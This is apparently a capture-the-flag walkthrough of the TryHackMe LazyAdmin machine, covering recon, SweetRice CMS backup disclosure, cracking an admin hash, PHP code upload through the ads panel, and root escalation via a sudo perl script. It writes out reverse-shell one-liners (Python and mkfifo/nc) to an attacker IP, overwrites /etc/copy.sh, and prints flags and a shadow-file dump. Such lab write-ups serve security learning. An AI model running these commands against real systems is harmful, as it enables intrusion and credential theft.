
# Recon
### Nmap

```
nmap -vvv -Pn -sC -sV -oN /opt/THM/LazyAdmin/1-recon/nmap/nmap_init.md 10.10.195.175
```

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/+sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy+ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n+QwL8+QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p+VtuxdH6mu9YztRymXmXPKJfB
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg+XwisNmDmdsHKumQYqiUbxqVd+E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=
|   256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

we see a web server on port 80

# Enumeration

### WEB Part 1

http://10.10.195.175/

![[main80.png]]

just a default web server

brute forcing web server directories we find a new directory

```
gobuster dir -u http://10.10.195.175:80 -w /usr/share/wordlists/dirb/big.txt -o /opt/THM/LazyAdmin/2-enum/web/gob_dir.md
```

```
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/content              (Status: 301) [Size: 316] [--> http://10.10.195.175/content/]
/server-status        (Status: 403) [Size: 278]
```

http://10.10.195.175/content/

![[content_dir.png]]


https://github.com/p0dalirius/SweetRice-webshell-plugin

guessed this directory from the github page

http://10.10.195.175/content/as/

![[sweetriceloginpage.png]]

this login form didn't reaaly lead anywhere, but after some searching for vulnerabilities

https://vulners.com/zdt/1337DAY-ID-26249

```
# SweetRice 1.5.1 - Backup Disclosure Vulnerability

Title: SweetRice 1.5.1 - Backup Disclosure
Application: SweetRice
Versions Affected: 1.5.1
Vendor URL: http://www.basic-cms.org/
Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
Discovered by: Ashiyane Digital Security Team
Tested on: Windows 10
Bugs: Backup Disclosure
 
 
Proof of Concept :
 
You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup
 
and can access to website files backup from:
http://localhost/SweetRice-transfer.zip

#  0day.today [2018-02-19]  #
```

from  here we can imply a */inc* directory

http://10.10.195.175/content/inc/

![[content_inc.png]]

we can find the mysql backup file

http://10.10.195.175/content/inc/mysql_backup/

![[mysqlbakaccess.png]]


while we are at it, we can confirm what version of sweetrice cms is running

http://10.10.195.175/content/inc/lastest.txt

1.5.1

### SQL

from the sql backup file that we downloaded we see the following contents

```
"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\
```

specifically this md5 looking hash

```
42f749ade7f9e195bf475f37a44cafcb
```

reversing the hash
```
Password123
```

back to the login page with these credentials. the username was the name/user next to that password hash in the backup file

### WEB Part 2

http://10.10.195.175/content/as/

```
manager
Password123
```

successful login

![[sr-dashboard.png]]



# Exploitation

### Exploit-DB 40700

[CVE-XXXX-XXXXX URL](http://google.com)

```
http://google.com
```

https://www.exploit-db.com/exploits/40700

seeing code execution in the name, i'd prefer to give this a try, we might be able to get a reverse shell

```html
# In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
PHP Codes In Ads File
# A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute
PHP Codes On Server .
# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; phpinfo(); 
Code You Can
```

this is the url on our target machine

http://10.10.195.175/content/as/?type=ad

code to run phpinfo from the demo exploit

![[phpinfo.png]]

from the published exploit

```html
# After HTML File Executed You Can Access Page In
http://localhost/sweetrice/inc/ads/hacked.php
```

so we will go to this url for our instance

```
http://10.10.195.175/content/inc/ads/phpinfo.php
```


![[phpinfoad.png]]

the vulnerability works, now we need to exploit it. PHPbash is a sweet tool for certain php code execution vulnerabilities. basically for when you upload php code in some way, then to execute it all you do is visit the url where that code was uploaded

https://github.com/Arrexel/phpbash/blob/master/phpbash.php

make a new ad and paste the php bash code

![[phpbashad.png]]


http://10.10.195.175/content/inc/ads/phpbash.php

![[phpbashadurl.png]]

/home/itguy/user.txt

```
THM{63e5bce9271952aad1113b6f1ac28a07}
```

and we have a basic shell running on the target machine
# Privilege Escalation

### Root

checking for sudo permissions in our php bash shell

```
www-data@THM-Chal

:/var/www/html/content/inc/ads# sudo -l
```

```
  
Matching Defaults entries for www-data on THM-Chal:  
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User www-data may run the following commands on THM-Chal:  
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

we can run a perl script from the user "itguy" directory with sudo permissions

that perlscript is owned by root

```
-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
```

we are still in phpbash, but we can run a python reverse shell and try upgrading it to a tty session

the reverse shell code:

```
export RHOST="10.6.18.190";export RPORT=1337;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

start a listener on the attacker machine

```
nc -lvnp 1337
```

copy and paste the reverse shell  code into php bash and enter

```
listening on [any] 1337 ...
connect to [10.6.18.190] from (UNKNOWN) [10.10.195.175] 35482
www-data@THM-Chal:/var/www/html/content/inc/ads$ whoami
whoami
www-data
www-data@THM-Chal:/var/www/html/content/inc/ads$ uname -a
uname -a
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
www-data@THM-Chal:/var/www/html/content/inc/ads$ 
```

contents of backup.pl

```
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

```
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

so the perl script runs a bash script at /etc/copy.sh.

the copy.sh is a reverse shell itself

we modify the ip and port in the the reverse shell command to direct back to our attacker machine  

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.18.190 1338 >/tmp/f" > /etc/copy.sh
```

start a new listener on attacker machine in a separate terminal

```
nc -lvnp 1338
```

in the first reverse shell, run the perl script with sudo privileges

```
sudo perl /home/itguy/backup.pl
```

we see a hit on our second reverse shell

```
listening on [any] 1338 ...
connect to [10.6.18.190] from (UNKNOWN) [10.10.195.175] 39480
# whoami
root
# uname -a
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
# sudo -l
Matching Defaults entries for root on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on THM-Chal:
    (ALL : ALL) ALL
# 
```

and we have a root shell

root.txt
```
THM{6637f41d0177b6f37cb20d775124699f}
```


```
root:!:18228:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:17954:0:99999:7:::
uuidd:*:17954:0:99999:7:::
lightdm:*:17954:0:99999:7:::
whoopsie:*:17954:0:99999:7:::
avahi-autoipd:*:17954:0:99999:7:::
avahi:*:17954:0:99999:7:::
dnsmasq:*:17954:0:99999:7:::
colord:*:17954:0:99999:7:::
speech-dispatcher:!:17954:0:99999:7:::
hplip:*:17954:0:99999:7:::
kernoops:*:17954:0:99999:7:::
pulse:*:17954:0:99999:7:::
rtkit:*:17954:0:99999:7:::
saned:*:17954:0:99999:7:::
usbmux:*:17954:0:99999:7:::
itguy:$6$lEFmSzBi$M/BzAIH6sOmfmItrGxeLHdyrhb08KQyx8o0fDAytD2Xu9YKbZyYYqYXtnn0nnQrLRMed8GKJbvA.RwGM9HU3y0:18228:0:99999:7:::
mysql:!:18229:0:99999:7:::
vboxadd:!:18229::::::
guest-3myc2b:!:18229::::::
sshd:*:18229:0:99999:7:::
```